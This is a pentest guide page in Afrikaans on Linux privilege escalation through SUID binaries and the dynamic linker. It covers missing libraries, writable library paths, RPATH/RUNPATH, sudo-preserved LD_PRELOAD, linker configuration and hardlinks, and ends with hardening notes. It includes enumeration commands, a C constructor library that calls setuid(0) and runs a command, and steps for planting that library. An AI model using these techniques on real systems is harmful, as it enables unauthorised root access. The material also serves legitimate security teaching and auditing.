# SUID Shared Library- en Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries word gewoonlik nagegaan vir direkte command execution, maar custom SUID-programme kan ook deur die dynamic linker kwesbaar wees. Die algemene tema is eenvoudig: ’n bevoorregte executable laai code vanaf ’n path of configuration wat ’n gebruiker met laer privileges kan beïnvloed.

Hierdie bladsy fokus op generiese technique patterns: ontbrekende libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` deur sudo, linker configuration, en SUID-hardlinkverwarring.

## Vinnige Enumeration

Begin deur ongewone SUID-lêers te vind en te kontroleer of hulle dynamically linked is:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Fokus op nie-standaardliggings, pasgemaakte toepassingspaaie, binaries wat deur root besit word maar buite pakketbestuurde gidse is, en dependencies wat vanaf skryfbare gidse gelaai word.

Nuttige skryfbaarheidstoetse:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Some custom SUID binaries probeer om ’n shared object te laai wat nie bestaan nie. Indien die ontbrekende pad onder ’n directory is wat deur die aanvaller beheer word, kan die binary attacker-supplied code as die effective user laai.

Vind mislukte library lookups:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
As die binary 'n skryfbare pad vir `libexample.so` deursoek, kan 'n minimale bewysbiblioteek 'n constructor gebruik. Hou die impakbewys skadeloos tydens validering:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Bou dit met die presiese lêernaam wat die binary probeer laai:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die uitbuitbare toestand is nie slegs die ontbrekende library nie. Die aanvaller moet ’n versoenbare shared object by ’n pad kan plaas wat die bevoorregte loader sal aanvaar.

## Skryfbare Library Directory

Soms bestaan al die dependencies, maar een van die directories wat gebruik word om hulle op te spoor, is skryfbaar. Dit kan dit moontlik maak om ’n gelaaide library te vervang of ’n library met dieselfde naam met hoër prioriteit te plant.

Hersien dependency-paaie:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
As die gids skryfbaar is, valideer dit met ’n copy-safe-benadering in ’n lab. Die vervanging van stelselbiblioteke op ’n aktiewe host kan authentication, package management of boot-critical services breek.

## RPATH en RUNPATH

`RPATH` en `RUNPATH` is dynamic-section-inskrywings wat vir die loader aandui waar om na biblioteke te soek. Hulle is gevaarlik in SUID-programme wanneer hulle na aanvaller-skryfbare gidse wys.

Detect hulle:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Voorbeeld van riskante uitvoer:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Indien `/opt/app/lib` skryfbaar is en die binary `libcustom.so` benodig, kan die aanvaller moontlik ’n kwaadwillige `libcustom.so` daar plaas:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` en `RUNPATH` is nie identies wat alle resolusiebesonderhede betref nie, maar vir privilege-escalation-oorsig is die praktiese vraag dieselfde: soek die SUID-binary na ’n library-naam in ’n directory wat deur ’n aanvaller geskryf kan word?

## LD_PRELOAD, LD_LIBRARY_PATH en SUID

Vir normale programme kan `LD_PRELOAD` en `LD_LIBRARY_PATH` die laai van shared objects afdwing of beïnvloed. Vir SUID-programme gaan die dynamic loader normaalweg na secure-execution mode en ignoreer dit gevaarlike environment variables.

Dit beteken dat ’n gewone SUID-binary gewoonlik nie kwesbaar is bloot omdat die gebruiker `LD_PRELOAD` kan stel nie:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die algemene uitsondering is sudo-wanopstelling. As `sudo -l` wys dat ’n veranderlike soos `LD_PRELOAD` of `LD_LIBRARY_PATH` behoue bly, kan ’n sudo-toegelate opdrag aanvaller-beheerde kode laai:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Moenie hierdie gevalle verwar nie:

- `LD_PRELOAD` teenoor 'n normale SUID-binary: word gewoonlik deur secure execution geblokkeer.
- `LD_PRELOAD` wat deur sudo behou word: kan moontlik uitgebuit word.
- Ontbrekende `.so` in 'n skryfbare pad: kan uitgebuit word wanneer die SUID-binary daardie pad natuurlik laai.
- `RPATH`/`RUNPATH` na 'n skryfbare gids: kan uitgebuit word wanneer 'n nodige library beheer kan word.
- Skryftoegang tot `/etc/ld.so.preload` of linker-konfigurasie: stelselwyd en met 'n groot impak.

## Linker-konfigurasie

Die dynamic linker lees ook stelselkonfigurasie soos `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, die linker-cache en, in sommige gevalle, `/etc/ld.so.preload`.

Belangrike kontroles:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Skryfbare linker configuration is gewoonlik ernstiger as een kwesbare SUID binary, omdat dit baie dynamically linked processes kan beïnvloed. `/etc/ld.so.preload` is besonder gevaarlik omdat dit ’n shared object in privileged processes kan afdwing.

## SUID Hardlink Confusion

Hardlinks kan veroorsaak dat dieselfde SUID inode onder verskeie name verskyn. Dit is nuttig om ’n privileged helper weg te steek, cleanup te verwar of naïewe path-based review te omseil.

Vind SUID-lêers met meer as een link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspekteer alle paaie na dieselfde inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Die misbruik is nie dat ’n hardlink toestemmings verander nie. Die misbruik is path confusion: ’n bevoorregte inode kan bereikbaar wees deur ’n naam wat verdedigers of scripts nie verwag nie. Vir ’n dieper oorsig van inode- en hardlink-werkvloeie, sien [Lêerstelsel, Inodes en Herstel](../main-system-information/filesystem-inodes-and-recovery.md).

## Verdedigingsnotas

- Hou SUID-binaries minimaal, geoudit en waar moontlik deur pakkette bestuur.
- Vermy `RPATH`/`RUNPATH`-inskrywings wat na skryfbare of toepassingsbestuurde gidse wys.
- Hou biblioteekgidse in besit van root en nie-skryfbaar vir gewone gebruikers nie.
- Moenie `LD_PRELOAD`, `LD_LIBRARY_PATH` of soortgelyke laaier-veranderlikes deur sudo behou nie.
- Monitor `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` en onverwagte SUID-lêers.
- Hersien hardgekoppelde SUID-lêers en ondersoek pasgemaakte SUID-wrappers buite standaardstelselpaaie.

{{#include ../../banners/hacktricks-training.md}}
